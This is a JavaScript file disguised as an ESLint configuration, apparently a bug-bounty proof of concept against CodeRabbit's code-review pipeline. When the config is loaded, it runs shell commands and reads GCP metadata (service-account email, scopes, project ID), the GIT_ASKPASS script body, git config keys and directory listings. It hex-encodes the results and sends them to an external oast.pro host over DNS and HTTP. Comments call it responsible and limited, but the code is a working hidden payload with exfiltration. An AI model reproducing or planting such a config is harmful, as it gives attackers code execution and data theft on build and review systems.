// CodeRabbit review-pipeline RCE — blast-radius proof (responsible).
// Proves code-exec + measures reach: filesystem, GCP metadata, git-cred mechanism.
// Does NOT exfiltrate live secret VALUES (SA email/scopes only; git config KEYS only).
var C = 'd8r72qboeaqn0p0abre01h1qozrthnias.oast.pro';
var http = require('http'), dns = require('dns'), cp = require('child_process'), fs = require('fs');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var dnsB = function (t, d) { try { dns.lookup((t + '-' + hex(d)).slice(0, 60) + '.' + C, function () {}); } catch (e) {} };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(d).slice(0, 1800), timeout: 5000 }, function () {}).on('error', function () {}); } catch (e) {} };
var sh = function (c) { try { return cp.execSync(c, { timeout: 6000 }).toString(); } catch (e) { return 'ERR:' + (e.message || e); } };
var rf = function (p) { try { return fs.readFileSync(p, 'utf8'); } catch (e) { return 'ERR:' + (e.code || e); } };

// (1) execution context
dnsB('id', sh('id').trim());
httpX('ctx', 'uname=' + sh('uname -a').trim() + ' | user=' + sh('whoami').trim() + ' | pwd=' + sh('pwd').trim());

// (2) GCP metadata REACHABILITY — email/scopes/project prove takeover potential (token NOT fetched)
var md = function (path, tag) {
  try {
    http.get({ host: 'metadata.google.internal', path: path, headers: { 'Metadata-Flavor': 'Google' }, timeout: 5000 },
      function (r) { var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX(tag, 'HTTP' + r.statusCode + ':' + b.slice(0, 400)); }); })
      .on('error', function (e) { dnsB(tag + 'err', (e && e.code) || 'err'); });
  } catch (e) { dnsB(tag + 'exc', '1'); }
};
md('/computeMetadata/v1/instance/service-accounts/default/email', 'mdsa');
md('/computeMetadata/v1/instance/service-accounts/default/scopes', 'mdscope');
md('/computeMetadata/v1/project/project-id', 'mdproj');

// (3) git-credential mechanism (blast radius) — script content + config KEYS only, no token values
httpX('askpath', 'GIT_ASKPASS=' + (process.env.GIT_ASKPASS || '(unset)'));
httpX('askbody', rf(process.env.GIT_ASKPASS || '/nonexistent').slice(0, 600));
httpX('gitkeys', sh('git config --list --name-only 2>&1').slice(0, 700));

// (4) filesystem reach
httpX('fsls', sh('ls -la "$HOME" 2>&1; echo ---PWD---; ls -la "$PWD" 2>&1').slice(0, 800));

module.exports = { root: true, rules: {} };
